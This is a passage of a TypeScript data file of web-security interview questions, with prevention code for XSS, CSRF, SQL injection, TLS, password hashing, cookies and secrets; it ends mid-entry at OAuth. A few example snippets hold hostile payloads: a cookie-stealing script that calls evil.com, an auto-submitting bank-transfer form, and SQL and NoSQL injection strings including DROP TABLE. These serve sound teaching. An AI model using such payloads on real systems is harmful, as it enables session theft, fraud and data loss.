import { InterviewQuestion } from '@/lib/interview-types';

export const securityInterviewQuestions: InterviewQuestion[] = [
  {
    id: 'sec-xss',
    category: 'security',
    type: 'theory',
    question: 'What is Cross-Site Scripting (XSS) and how do you prevent it?',
    difficulty: 'intermediate',
    tags: ['xss', 'security', 'owasp'],
    shortAnswer: 'XSS allows attackers to inject malicious scripts into web pages viewed by other users. Prevent with output encoding, Content Security Policy (CSP), and never trusting user input.',
    detailedExplanation: 'XSS attacks inject malicious client-side scripts into pages. Three types: Stored XSS (injected data saved in database, executed when others view it), Reflected XSS (script in URL, reflected back in response), DOM-based XSS (client-side script writes attacker data to DOM). Can steal cookies, session tokens, redirect users, or capture keystrokes. Prevention: HTML encode output, use textContent over innerHTML, CSP headers, HttpOnly cookies.',
    example: {
      code: `// VULNERABLE code
const username = req.query.name;
// âŒ Directly injecting user input into HTML
res.send('<h1>Hello ' + username + '</h1>');
// If name = <script>document.location='http://evil.com/steal?c='+document.cookie</script>
// Other users see the page, their cookies are stolen!

// PREVENTION 1: Escape HTML output
const escapeHtml = (str) => str
  .replace(/&/g, '&amp;')
  .replace(/</g, '&lt;')
  .replace(/>/g, '&gt;')
  .replace(/"/g, '&quot;')
  .replace(/'/g, '&#39;');

res.send('<h1>Hello ' + escapeHtml(username) + '</h1>');

// PREVENTION 2: Use textContent not innerHTML
// âŒ Dangerous
element.innerHTML = userInput;
// âœ… Safe
element.textContent = userInput;

// PREVENTION 3: Content Security Policy (CSP) header
res.setHeader('Content-Security-Policy',
  "default-src 'self'; script-src 'self'; style-src 'self'");
// Blocks inline scripts and scripts from other origins

// PREVENTION 4: HttpOnly cookies (can't be stolen by JS)
res.cookie('session', token, {
  httpOnly: true,  // JS can't access this cookie
  secure: true,    // HTTPS only
  sameSite: 'strict'
});

// PREVENTION 5: React is safe by default
function Safe({ userInput }) {
  return <div>{userInput}</div>; // React escapes this automatically
}
// âŒ But this is dangerous in React:
function Unsafe({ userInput }) {
  return <div dangerouslySetInnerHTML={{ __html: userInput }} />;
}`,
      language: 'javascript'
    },
    interviewAnswer: 'XSS is one of the most common web vulnerabilities. The root cause is mixing data with code. React protects against it by default by escaping JSX expressions, which is why I avoid dangerouslySetInnerHTML. I set Content-Security-Policy headers to block inline scripts and third-party scripts. HttpOnly cookies prevent session theft even if XSS occurs. I also sanitize user input with libraries like DOMPurify when HTML output is required.',
    commonMistakes: [
      'Using dangerouslySetInnerHTML without sanitization',
      'Trusting data from your own database (it could have stored XSS)',
      'Not setting HttpOnly on session cookies',
      'Using innerHTML with user data in vanilla JS'
    ],
    realWorldUse: 'XSS is in OWASP Top 10. Many major sites have had XSS vulnerabilities - Twitter, Facebook. Bug bounty programs often reward XSS findings. Every web developer needs to understand it.',
    followUpQuestions: [
      'What is the difference between stored and reflected XSS?',
      'What does HttpOnly do to cookies?',
      'How does Content Security Policy prevent XSS?'
    ]
  },

  {
    id: 'sec-csrf',
    category: 'security',
    type: 'theory',
    question: 'What is CSRF (Cross-Site Request Forgery) and how do you prevent it?',
    difficulty: 'intermediate',
    tags: ['csrf', 'security', 'tokens'],
    shortAnswer: 'CSRF tricks authenticated users into making unintended requests. The browser auto-sends cookies with cross-site requests. Prevent with CSRF tokens, SameSite cookies, and checking Origin/Referer headers.',
    detailedExplanation: 'CSRF exploits that browsers automatically include cookies with every request to a domain, even from other websites. An attacker on evil.com can embed a form that submits to bank.com - the victim\'s session cookie is included automatically. Prevention: CSRF tokens (secret per-session token submitted with forms, server validates), SameSite cookie attribute, checking Origin/Referer headers. Modern browsers with SameSite=Strict largely prevent CSRF for cookies.',
    example: {
      code: `// CSRF Attack Example
// evil.com has a hidden form that submits to bank.com:
<form action="https://bank.com/transfer" method="POST">
  <input name="amount" value="10000" />
  <input name="to" value="attacker-account" />
</form>
<script>document.forms[0].submit();</script>
// When victim visits evil.com, this form auto-submits
// Bank.com receives request WITH victim's session cookie!

// PREVENTION 1: CSRF Token (most common)
// Server generates random token, embeds in form, validates on submit
app.use(csrf({ cookie: true })); // csurf package

app.get('/form', (req, res) => {
  res.render('form', { csrfToken: req.csrfToken() });
});

// In HTML form:
// <input type="hidden" name="_csrf" value="<%= csrfToken %>" />

// Server auto-validates _csrf token on POST

// PREVENTION 2: SameSite Cookies
res.cookie('session', token, {
  sameSite: 'strict',  // Cookie NOT sent on cross-site requests
  // or 'lax' - not sent on cross-site POST but sent on GET navigation
  httpOnly: true,
  secure: true
});

// PREVENTION 3: Check Origin/Referer header
app.use((req, res, next) => {
  if (req.method !== 'GET') {
    const origin = req.headers.origin || req.headers.referer;
    if (!origin?.startsWith('https://myapp.com')) {
      return res.status(403).json({ error: 'Invalid origin' });
    }
  }
  next();
});

// PREVENTION 4: Custom request header (AJAX)
// Browsers don't allow cross-origin custom headers without CORS
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-Requested-With': 'XMLHttpRequest' // Custom header
  },
  body: JSON.stringify({ amount: 100 })
});`,
      language: 'javascript'
    },
    interviewAnswer: 'CSRF abuses the fact that browsers automatically send cookies with every request. An attacker can trigger requests to your API from their website, and the victim\'s session cookie goes with it. I use SameSite=Strict cookies for modern browsers, which is now the default in most browsers. For extra protection I use CSRF tokens in forms. For JSON APIs, the Content-Type: application/json requirement is itself a CSRF mitigation since simple forms can\'t set that header.',
    commonMistakes: [
      'Thinking CORS protects against CSRF (it doesn\'t - CORS controls reading responses, not making requests)',
      'Not using SameSite cookie attribute',
      'Not validating CSRF tokens on all state-changing endpoints',
      'Only checking GET requests (attacks typically use POST)'
    ],
    realWorldUse: 'CSRF is in OWASP Top 10. Rails, Django, and most frameworks have built-in CSRF protection. Single-page apps with JWTs in localStorage aren\'t vulnerable to CSRF (but are vulnerable to XSS).',
    followUpQuestions: [
      'How is CSRF different from XSS?',
      'Does CORS prevent CSRF?',
      'Why is SameSite=Strict effective against CSRF?'
    ]
  },

  {
    id: 'sec-sql-injection',
    category: 'security',
    type: 'theory',
    question: 'What is SQL Injection and how do you prevent it?',
    difficulty: 'intermediate',
    tags: ['sql-injection', 'security', 'database'],
    shortAnswer: 'SQL Injection lets attackers manipulate database queries by injecting SQL code through user input. Prevent with parameterized queries/prepared statements â€” never concatenate user input into SQL.',
    detailedExplanation: 'SQL Injection occurs when user input is concatenated directly into SQL queries. An attacker can terminate the query early, append their own SQL, comment out the rest, dump data, or bypass authentication. Classic example: entering \' OR \'1\'=\'1 in a login form. Prevention: parameterized queries (prepared statements) pass data separately from SQL structure, so it can never be interpreted as SQL.',
    example: {
      code: `// VULNERABLE code
app.post('/login', (req, res) => {
  const { username, password } = req.body;
  
  // âŒ String concatenation - DANGEROUS!
  const query = "SELECT * FROM users WHERE username='" + username + "' AND password='" + password + "'";
  db.query(query);
  
  // If username = "admin' --" and password = "anything"
  // Query becomes: SELECT * FROM users WHERE username='admin' --' AND password='anything'
  // The -- comments out the password check!
  // Attacker logs in as admin without password!
  
  // Even worse: username = "'; DROP TABLE users; --"
  // Deletes entire users table!
});

// âœ… PREVENTION 1: Parameterized queries (SQL/MySQL)
const query = 'SELECT * FROM users WHERE username = ? AND password = ?';
db.query(query, [username, password]); // Data passed separately

// âœ… PREVENTION 2: Prepared statements (PostgreSQL)
const { rows } = await pool.query(
  'SELECT * FROM users WHERE username = $1 AND password = $2',
  [username, password]
);

// âœ… PREVENTION 3: ORM (Mongoose, Sequelize, Prisma)
// ORMs use parameterized queries internally
const user = await User.findOne({ username, password });

// MongoDB is NOT immune - NoSQL injection is possible
// âŒ Vulnerable
const user = await User.findOne({ username: req.body.username });
// If req.body.username = { $gt: "" } -> matches all users!

// âœ… Safe - validate input type
const username = String(req.body.username); // Force string
const user = await User.findOne({ username });

// âœ… Express-validator for input validation
const { body, validationResult } = require('express-validator');

app.post('/login', [
  body('username').isString().trim().escape(),
  body('password').isString().isLength({ min: 8 })
], (req, res) => {
  const errors = validationResult(req);
  if (!errors.isEmpty()) {
    return res.status(400).json({ errors: errors.array() });
  }
  // Safe to proceed
});`,
      language: 'javascript'
    },
    interviewAnswer: 'SQL injection is the classic web vulnerability - it\'s been #1 in OWASP Top 10 for years. The fix is simple: never concatenate user input into queries. Always use parameterized queries where the database driver handles escaping. With ORMs like Mongoose or Prisma, this is handled automatically as long as I don\'t use raw query methods. I also validate and sanitize input with express-validator as a defense in depth.',
    commonMistakes: [
      'String formatting SQL queries with user input',
      'Thinking MongoDB is immune (NoSQL injection exists)',
      'Using raw SQL methods in ORMs without parameters',
      'Not validating input types (object injection in MongoDB)'
    ],
    realWorldUse: 'SQL injection is in OWASP Top 10 every year. Major companies have been breached via SQLi. Every developer must know this. Penetration testers always check for SQLi.',
    followUpQuestions: [
      'What is NoSQL injection?',
      'Why do parameterized queries prevent SQL injection?',
      'What is the principle of least privilege for databases?'
    ]
  },

  {
    id: 'sec-https-ssl',
    category: 'security',
    type: 'theory',
    question: 'What is HTTPS and how does TLS/SSL work?',
    difficulty: 'beginner',
    tags: ['https', 'ssl', 'tls', 'encryption'],
    shortAnswer: 'HTTPS = HTTP + TLS encryption. TLS creates an encrypted tunnel using asymmetric encryption for key exchange and symmetric encryption for data. Prevents eavesdropping and man-in-the-middle attacks.',
    detailedExplanation: 'TLS (Transport Layer Security) encrypts HTTP traffic. TLS handshake: 1) Client sends supported TLS versions and cipher suites. 2) Server responds with certificate (containing public key). 3) Client verifies certificate with trusted CA. 4) They agree on a session key using asymmetric encryption. 5) All data encrypted with fast symmetric encryption using session key. HTTPS also authenticates the server identity, preventing impersonation.',
    example: {
      code: `// Setting up HTTPS in Node.js
const https = require('https');
const fs = require('fs');

const options = {
  key: fs.readFileSync('private.key'),
  cert: fs.readFileSync('certificate.crt')
};

https.createServer(options, app).listen(443);

// Redirect HTTP to HTTPS
const http = require('http');
http.createServer((req, res) => {
  res.writeHead(301, { Location: 'https://' + req.headers.host + req.url });
  res.end();
}).listen(80);

// Security headers with HTTPS
app.use((req, res, next) => {
  // Tell browsers to only use HTTPS for 1 year
  res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
  next();
});

// Using helmet.js for all security headers
const helmet = require('helmet');
app.use(helmet()); // Sets HSTS, X-Frame-Options, CSP, etc.

// TLS in production:
// - Use certificates from Let's Encrypt (free) or commercial CA
// - TLS 1.2 minimum (disable 1.0, 1.1)
// - Strong cipher suites
// - Certificate expiry monitoring

// Check TLS configuration
// https://www.ssllabs.com/ssltest/

// HTTP vs HTTPS
// HTTP:  Request/response in plaintext - anyone can read it
// HTTPS: Request/response encrypted - only client and server can read

// Why HTTPS matters for APIs
// Without HTTPS: JWT tokens, passwords visible in transit
// Attacker on same WiFi can steal tokens (man-in-the-middle)`,
      language: 'javascript'
    },
    interviewAnswer: 'HTTPS is non-negotiable for any production app. Without it, every piece of data including passwords, tokens, and personal data is visible to anyone on the network. TLS uses a clever combination: asymmetric encryption for the handshake (establishing a shared secret), then fast symmetric encryption for actual data. I always enforce HTTPS redirects, set HSTS headers, and use helmet.js for security headers. Let\'s Encrypt makes free certificates easy.',
    commonMistakes: [
      'Not redirecting HTTP to HTTPS',
      'Not setting HSTS header',
      'Using self-signed certificates in production',
      'Not monitoring certificate expiry'
    ],
    realWorldUse: 'Required for SEO (Google penalizes HTTP sites), security (browsers warn on HTTP forms), and modern APIs (fetch() blocks mixed content). Let\'s Encrypt makes it free. Cloudflare provides free TLS for any site.',
    followUpQuestions: [
      'What is the difference between TLS and SSL?',
      'What is HSTS?',
      'How does certificate validation work?'
    ]
  },

  {
    id: 'sec-password-hashing',
    category: 'security',
    type: 'theory',
    question: 'How should passwords be stored securely?',
    difficulty: 'intermediate',
    tags: ['passwords', 'bcrypt', 'hashing'],
    shortAnswer: 'Never store plain text passwords. Hash with bcrypt, Argon2, or PBKDF2 â€” algorithms designed to be slow. Salt prevents rainbow table attacks. Verify by hashing the attempt and comparing hashes.',
    detailedExplanation: 'Plain text storage: immediate breach exposure. MD5/SHA1: too fast, attackers can compute billions of hashes/second. bcrypt/Argon2/PBKDF2 are designed to be computationally expensive and adjustable. Salt is random data added before hashing, making identical passwords produce different hashes, preventing rainbow table attacks. Work factor controls how slow the hash is - increase over time as hardware improves.',
    example: {
      code: `const bcrypt = require('bcrypt');

// REGISTER - hash password before storing
app.post('/api/register', async (req, res) => {
  const { email, password } = req.body;
  
  // Validate password strength first
  if (password.length < 8) {
    return res.status(400).json({ error: 'Password too short' });
  }
  
  // Hash with cost factor 12 (12 rounds of salting)
  // Higher = slower = more secure but takes longer
  const saltRounds = 12;
  const passwordHash = await bcrypt.hash(password, saltRounds);
  
  // Store hash, NEVER the plain password
  const user = await User.create({ email, passwordHash });
  
  res.status(201).json({ id: user._id });
});

// LOGIN - compare hash
app.post('/api/login', async (req, res) => {
  const { email, password } = req.body;
  
  const user = await User.findOne({ email });
  
  if (!user) {
    // âš ï¸ Same response for missing user vs wrong password
    // Prevents username enumeration attacks
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  
  // Timing-safe comparison (bcrypt handles this)
  const isMatch = await bcrypt.compare(password, user.passwordHash);
  
  if (!isMatch) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  
  const token = jwt.sign({ userId: user._id }, process.env.JWT_SECRET);
  res.json({ token });
});

// What bcrypt stores:
// $2b$12$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy
//  ^^ ^^ ^^^^^^^^^^^^^^^^^ ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
//  alg cost     salt (22 chars)           hash (31 chars)

// DON'T do this:
const md5Hash = require('md5')(password); // MD5 is broken!
const sha256 = crypto.createHash('sha256').update(password).digest('hex');
// SHA256 without salt/slow work factor is insecure!`,
      language: 'javascript'
    },
    interviewAnswer: 'The rule is: never store passwords in plain text, never use fast hash algorithms like MD5 or SHA256. I use bcrypt with a cost factor of 12 â€” it\'s intentionally slow so brute-force attacks take years. bcrypt automatically handles salting, so identical passwords produce different hashes. I return the same error message for wrong email and wrong password to prevent username enumeration attacks.',
    commonMistakes: [
      'Using MD5 or SHA1 for passwords',
      'Forgetting to salt (allows rainbow table attacks)',
      'Using too low cost factor (fast to brute force)',
      'Different error messages revealing if username exists'
    ],
    realWorldUse: 'Every application with user accounts. LinkedIn, Adobe, RockYou had password breaches exposing millions of weak hashes. bcrypt or Argon2 is the industry standard.',
    followUpQuestions: [
      'What is the difference between hashing and encryption?',
      'What is a rainbow table?',
      'Why is bcrypt better than SHA256 for passwords?'
    ]
  },

  {
    id: 'sec-auth-authorization',
    category: 'security',
    type: 'theory',
    question: 'What security headers should every web application set?',
    difficulty: 'intermediate',
    tags: ['security-headers', 'csp', 'helmet'],
    shortAnswer: 'Key headers: Content-Security-Policy (prevent XSS), HSTS (force HTTPS), X-Frame-Options (prevent clickjacking), X-Content-Type-Options (prevent MIME sniffing). Use helmet.js to set them all.',
    detailedExplanation: 'Security headers instruct browsers on security policies. Content-Security-Policy restricts which scripts/styles/images can load, preventing XSS. HSTS tells browsers to only use HTTPS. X-Frame-Options prevents clickjacking (embedding your page in an iframe). X-Content-Type-Options prevents MIME type sniffing. Referrer-Policy controls referrer header. Permissions-Policy controls browser features. helmet.js package sets sensible defaults for all.',
    example: {
      code: `// helmet.js (recommended)
const helmet = require('helmet');
app.use(helmet()); // Sets all security headers automatically

// Manual security headers
app.use((req, res, next) => {
  // CSP: Only allow scripts from own origin
  res.setHeader('Content-Security-Policy',
    "default-src 'self'; " +
    "script-src 'self' 'nonce-{random}'; " +
    "style-src 'self' 'unsafe-inline'; " +  // Allow inline CSS
    "img-src 'self' data: https:; " +
    "connect-src 'self' https://api.myapp.com"
  );
  
  // Force HTTPS for 1 year
  res.setHeader('Strict-Transport-Security',
    'max-age=31536000; includeSubDomains; preload');
  
  // Prevent clickjacking (embedding in iframes)
  res.setHeader('X-Frame-Options', 'DENY');
  // or 'SAMEORIGIN' to allow own iframes
  
  // Prevent MIME sniffing
  res.setHeader('X-Content-Type-Options', 'nosniff');
  
  // Control referrer information
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
  
  // Disable browser features
  res.setHeader('Permissions-Policy',
    'geolocation=(), microphone=(), camera=()');
  
  next();
});

// Configure helmet specifically
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "https://cdn.jsdelivr.net"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "https:"],
    }
  },
  hsts: {
    maxAge: 31536000,
    includeSubDomains: true
  }
}));

// Check your headers at:
// https://securityheaders.com`,
      language: 'javascript'
    },
    interviewAnswer: 'Security headers are the easiest, highest-impact security improvement. I use helmet.js on every Express app - it\'s one line of code that sets all the important headers. CSP is the most powerful - it prevents XSS by whitelisting allowed script sources. X-Frame-Options prevents clickjacking attacks. I check securityheaders.com to verify headers are correct. It\'s often overlooked but interviewers appreciate it.',
    commonMistakes: [
      'Not using helmet.js or similar (missing headers)',
      'CSP that\'s too permissive (unsafe-inline or unsafe-eval)',
      'Not setting HSTS (browsers still try HTTP)',
      'Missing X-Frame-Options on admin panels'
    ],
    realWorldUse: 'Every production web application should have security headers. Chrome DevTools > Network tab shows response headers. SecurityHeaders.com grades your headers.',
    followUpQuestions: [
      'What does CSP protect against?',
      'What is clickjacking?',
      'What does nosniff do?'
    ]
  },

  {
    id: 'sec-input-validation',
    category: 'security',
    type: 'theory',
    question: 'What is input validation and sanitization? Why is it important?',
    difficulty: 'beginner',
    tags: ['validation', 'sanitization', 'security'],
    shortAnswer: 'Validation checks if input meets expected format (length, type, pattern). Sanitization cleans input by removing or encoding dangerous characters. Both are needed â€” validate first, then sanitize.',
    detailedExplanation: 'Never trust user input. Validation ensures data is in the expected format before processing. Sanitization transforms input to remove dangerous content. These prevent XSS, SQL injection, and NoSQL injection. Use validation libraries like Joi, Yup, or express-validator. Validate on both client (UX) and server (security). Server validation is mandatory â€” client validation can be bypassed.',
    example: {
      code: `// express-validator
const { body, param, query, validationResult } = require('express-validator');

// Define validation rules
const createUserRules = [
  body('email')
    .isEmail().withMessage('Invalid email')
    .normalizeEmail(), // Sanitize: lowercase, remove dots in Gmail
    
  body('password')
    .isLength({ min: 8 }).withMessage('Min 8 characters')
    .matches(/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)/)
    .withMessage('Must contain uppercase, lowercase, and number'),
    
  body('username')
    .isAlphanumeric().withMessage('Only letters and numbers')
    .isLength({ min: 3, max: 30 })
    .trim()  // Sanitize: remove whitespace
    .escape(), // Sanitize: encode HTML entities
    
  body('age')
    .isInt({ min: 0, max: 150 }).withMessage('Invalid age')
    .toInt(), // Convert to integer
];

app.post('/api/users', createUserRules, (req, res) => {
  const errors = validationResult(req);
  
  if (!errors.isEmpty()) {
    return res.status(422).json({ 
      errors: errors.array() 
    });
  }
  
  // Data is now validated and sanitized
  const { email, password, username, age } = req.body;
  // Safe to use
});

// Joi validation (alternative)
const Joi = require('joi');

const schema = Joi.object({
  email: Joi.string().email().required(),
  password: Joi.string().min(8).pattern(/[A-Z]/).required(),
  age: Joi.number().integer().min(18).max(120)
});

const { error, value } = schema.validate(req.body);
if (error) {
  return res.status(400).json({ error: error.details[0].message });
}

// MongoDB: sanitize to prevent NoSQL injection
const mongoSanitize = require('express-mongo-sanitize');
app.use(mongoSanitize()); // Strips $ and . from req.body`,
      language: 'javascript'
    },
    interviewAnswer: 'Input validation and sanitization is defense in depth. Validation ensures data is in the expected format â€” email is an email, age is a number, name isn\'t 10,000 characters. Sanitization removes dangerous content. I validate on both frontend (better UX) and backend (actual security). express-validator makes this clean with declarative rules. I also use express-mongo-sanitize to prevent NoSQL injection attempts.',
    commonMistakes: [
      'Only validating on the frontend (easily bypassed)',
      'Not validating data type (number vs string)',
      'Trusting data from your own database (secondary injection)',
      'Allowing unbounded input lengths'
    ],
    realWorldUse: 'Every user-facing form and API endpoint needs validation. Stripe validates every API parameter. Form validation libraries (Formik + Yup, React Hook Form + Zod) provide client-side validation that mirrors server validation.',
    followUpQuestions: [
      'What is the difference between validation and sanitization?',
      'Should you validate on client or server?',
      'What is express-mongo-sanitize?'
    ]
  },

  {
    id: 'sec-rate-limiting',
    category: 'security',
    type: 'theory',
    question: 'What is brute force attack protection and how do you implement it?',
    difficulty: 'intermediate',
    tags: ['brute-force', 'rate-limiting', 'security'],
    shortAnswer: 'Brute force attacks repeatedly try passwords or tokens. Protect with rate limiting on auth endpoints, account lockout after N failed attempts, CAPTCHA, and MFA.',
    detailedExplanation: 'Brute force attacks systematically try all possible passwords. A fast server without protection can be checked at thousands of attempts per second. Rate limiting slows the attack. Account lockout after N failures stops it entirely. CAPTCHA (reCAPTCHA) requires human interaction. Multi-factor authentication means a stolen password alone isn\'t enough. Progressive delays make each attempt wait longer.',
    example: {
      code: `const rateLimit = require('express-rate-limit');
const slowDown = require('express-slow-down');

// Rate limit login endpoint (10 attempts per 15 minutes)
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,  // 15 minutes
  max: 10,                     // Max 10 attempts
  message: { 
    error: 'Too many login attempts. Try again in 15 minutes.'
  },
  skipSuccessfulRequests: true, // Don't count successful logins
  keyGenerator: (req) => req.body.email || req.ip
  // Rate limit per email, not per IP (IP can change)
});

// Progressive slowdown (add delay after 5 attempts)
const speedLimiter = slowDown({
  windowMs: 15 * 60 * 1000,
  delayAfter: 5,    // After 5 requests in window...
  delayMs: () => 500  // Add 500ms delay per request
});

app.post('/api/login', loginLimiter, speedLimiter, loginHandler);

// Account lockout (lock after 5 failed attempts)
app.post('/api/login', async (req, res) => {
  const user = await User.findOne({ email: req.body.email });
  
  if (!user) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  
  // Check lockout
  if (user.lockUntil && user.lockUntil > Date.now()) {
    const minutes = Math.ceil((user.lockUntil - Date.now()) / 60000);
    return res.status(423).json({ 
      error: \`Account locked. Try again in \${minutes} minutes.\`
    });
  }
  
  const isMatch = await bcrypt.compare(req.body.password, user.passwordHash);
  
  if (!isMatch) {
    // Increment failed attempts
    const failedAttempts = (user.loginAttempts || 0) + 1;
    
    if (failedAttempts >= 5) {
      // Lock account for 1 hour
      await User.findByIdAndUpdate(user._id, {
        loginAttempts: 0,
        lockUntil: Date.now() + 60 * 60 * 1000
      });
      return res.status(423).json({ error: 'Account locked for 1 hour' });
    }
    
    await User.findByIdAndUpdate(user._id, { loginAttempts: failedAttempts });
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  
  // Success - reset counter
  await User.findByIdAndUpdate(user._id, { 
    loginAttempts: 0,
    lockUntil: null,
    lastLogin: new Date()
  });
  
  const token = jwt.sign({ userId: user._id }, process.env.JWT_SECRET);
  res.json({ token });
});`,
      language: 'javascript'
    },
    interviewAnswer: 'Brute force protection layers several defenses. Rate limiting is the first â€” I use express-rate-limit scoped to the email address, not just IP (VPNs bypass IP limits). Account lockout adds another layer after repeated failures. I show a CAPTCHA after 3 failed attempts. Most importantly, I recommend users enable MFA â€” even if an attacker guesses the password, they can\'t get in without the second factor.',
    commonMistakes: [
      'Rate limiting by IP only (VPN bypass)',
      'Infinite lockout that can be used as DoS attack on accounts',
      'Not having any protection on auth endpoints',
      'Too long lockout causing legitimate user lockout'
    ],
    realWorldUse: 'Every authentication system needs brute force protection. Have I Been Pwned API lets you check if a password was in known breaches. Auth0 and Firebase handle this automatically.',
    followUpQuestions: [
      'What is credential stuffing?',
      'What is the difference between rate limiting and account lockout?',
      'How does MFA help against brute force?'
    ]
  },

  {
    id: 'sec-env-variables',
    category: 'security',
    type: 'theory',
    question: 'How should you handle secrets and environment variables securely?',
    difficulty: 'beginner',
    tags: ['environment-variables', 'secrets', 'security'],
    shortAnswer: 'Never hardcode secrets in code. Use environment variables via .env files (never commit to git). In production, use secret managers (AWS Secrets Manager, Vault). Rotate secrets regularly.',
    detailedExplanation: 'Hardcoded secrets in code or committed .env files are major vulnerabilities. Anyone with code access has production credentials. Use .env files for development, never commit them. Environment variables are injected by the platform in production (Heroku, Vercel, AWS). For sensitive secrets, use dedicated secret managers. Rotate secrets after any potential exposure. Use different secrets for each environment.',
    example: {
      code: `// .env file (NEVER commit this to git!)
DATABASE_URL=mongodb://user:pass@localhost:27017/myapp
JWT_SECRET=super-secret-key-12345
STRIPE_SECRET_KEY=sk_test_abc123
EMAIL_API_KEY=key-xyz789

// .gitignore - must include .env!
.env
.env.local
.env.production
.env*.local

// Load env in Node.js
require('dotenv').config(); // Must be first line

// Access environment variables
const jwtSecret = process.env.JWT_SECRET;
const dbUrl = process.env.DATABASE_URL;

// âŒ Never do this
const jwtSecret = 'hardcoded-secret-in-code'; // In git = compromised!

// Validate required env vars on startup
function validateEnv() {
  const required = ['DATABASE_URL', 'JWT_SECRET', 'STRIPE_SECRET_KEY'];
  
  for (const key of required) {
    if (!process.env[key]) {
      console.error(\`Missing required env var: \${key}\`);
      process.exit(1); // Don't start if misconfigured
    }
  }
}

validateEnv();

// env-example file (safe to commit - no values)
// DATABASE_URL=
// JWT_SECRET=
// STRIPE_SECRET_KEY=

// Using different secrets per environment
const config = {
  development: {
    jwtSecret: process.env.JWT_SECRET, // From .env.development
  },
  production: {
    jwtSecret: process.env.JWT_SECRET, // From cloud provider secrets
  }
};

// AWS Secrets Manager (production)
const { SecretsManagerClient, GetSecretValueCommand } = require('@aws-sdk/client-secrets-manager');

async function getSecret(secretName) {
  const client = new SecretsManagerClient({ region: 'us-east-1' });
  const response = await client.send(new GetSecretValueCommand({ SecretId: secretName }));
  return JSON.parse(response.SecretString);
}`,
      language: 'javascript'
    },
    interviewAnswer: 'Secret management is critical and commonly overlooked. I always add .env to .gitignore before the first commit â€” once committed, secrets live in git history forever even after deletion. In development, I use .env files. In production, I use the platform\'s built-in secret management â€” Vercel environment variables, AWS Secrets Manager, or Kubernetes Secrets. I also provide a .env.example with all keys but no values so new developers know what\'s needed.',
    commonMistakes: [
      'Committing .env files to git',
      'Using the same secrets in development and production',
      'Not rotating secrets after potential exposure',
      'Not having .env in .gitignore from day one'
    ],
    realWorldUse: 'Secret exposure is a top cause of security breaches. GitHub\'s secret scanning detects accidentally committed secrets. AWS access keys committed to public repos are found by bots within minutes.',
    followUpQuestions: [
      'What do you do if you accidentally commit secrets to git?',
      'What is AWS Secrets Manager?',
      'How do you share secrets with a team securely?'
    ]
  },

  {
    id: 'sec-https-cookies',
    category: 'security',
    type: 'theory',
    question: 'What are secure cookie attributes? HttpOnly, Secure, SameSite?',
    difficulty: 'intermediate',
    tags: ['cookies', 'security', 'session'],
    shortAnswer: 'HttpOnly prevents JS access (stops XSS token theft). Secure sends cookie only over HTTPS. SameSite=Strict prevents CSRF by blocking cross-site requests from sending cookies.',
    detailedExplanation: 'Cookie security attributes protect session tokens. HttpOnly prevents JavaScript from reading the cookie (document.cookie), protecting against XSS-based session hijacking. Secure ensures the cookie is only sent over HTTPS. SameSite=Strict means the cookie is never sent with cross-site requests, preventing CSRF. SameSite=Lax sends cookie on top-level navigation GET but not on form POSTs from other sites. Max-Age/Expires controls session duration.',
    example: {
      code: `// Setting secure cookies in Express
const cookieParser = require('cookie-parser');
app.use(cookieParser());

// Login endpoint - set session cookie
app.post('/api/login', async (req, res) => {
  const { email, password } = req.body;
  const user = await authenticateUser(email, password);
  
  if (!user) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  
  const sessionToken = generateSecureToken();
  await saveSession(sessionToken, user.id);
  
  res.cookie('sessionId', sessionToken, {
    httpOnly: true,   // JS cannot read this cookie
    secure: true,     // Only sent over HTTPS
    sameSite: 'strict', // Not sent on cross-site requests
    maxAge: 7 * 24 * 60 * 60 * 1000, // 7 days
    path: '/',
  });
  
  res.json({ message: 'Logged in' });
});

// Cookie attributes comparison:
// Without HttpOnly:
document.cookie; // Can access session token! (XSS vulnerability)

// With HttpOnly:
document.cookie; // Session cookie is NOT visible here

// SameSite values:
// strict: Never sent for cross-site requests
// lax:    Sent on top-level navigation (default in modern browsers)
// none:   Always sent (requires Secure, used for cross-site embeds)

// For SPAs using JWT in Authorization header:
// JWT in localStorage is accessible to JS (XSS risk)
// JWT in httpOnly cookie is safer but requires CSRF protection
// Trade-off depends on your threat model

res.cookie('token', jwtToken, {
  httpOnly: true,  // Protects against XSS
  secure: process.env.NODE_ENV === 'production',
  sameSite: 'strict', // Protects against CSRF
  maxAge: 24 * 60 * 60 * 1000 // 24 hours
});

// Read cookie in subsequent requests
app.get('/api/me', (req, res) => {
  const token = req.cookies.token; // Read via cookie-parser
  const decoded = jwt.verify(token, process.env.JWT_SECRET);
  res.json({ userId: decoded.userId });
});`,
      language: 'javascript'
    },
    interviewAnswer: 'Cookie security attributes are three simple settings that prevent major attacks. HttpOnly stops XSS attacks from stealing session tokens â€” even if an attacker injects script, it can\'t read the cookie. Secure prevents transmission over plain HTTP. SameSite=Strict prevents CSRF attacks because cross-site requests don\'t include the cookie. I always set all three for any cookie that stores authentication data.',
    commonMistakes: [
      'Not setting HttpOnly (allows XSS to steal sessions)',
      'Not setting Secure in production (transmits over HTTP)',
      'SameSite=None without Secure (rejected by browsers)',
      'Very long Max-Age (session never expires)'
    ],
    realWorldUse: 'Every session cookie and auth token cookie should have all three attributes. OAuth flows use cookies for CSRF state tokens. Express-session sets these correctly by default when configured properly.',
    followUpQuestions: [
      'Should I store JWT in localStorage or a cookie?',
      'What is session fixation?',
      'How does SameSite=Lax differ from Strict?'
    ]
  },

  {
    id: 'sec-oauth',
    category: 'security',
    type: 'theory',
    question: 'What is OAuth 2.0 and how does it work?',
    difficulty: 'advanced',
    tags: ['oauth', 'authentication', 'authorization'],
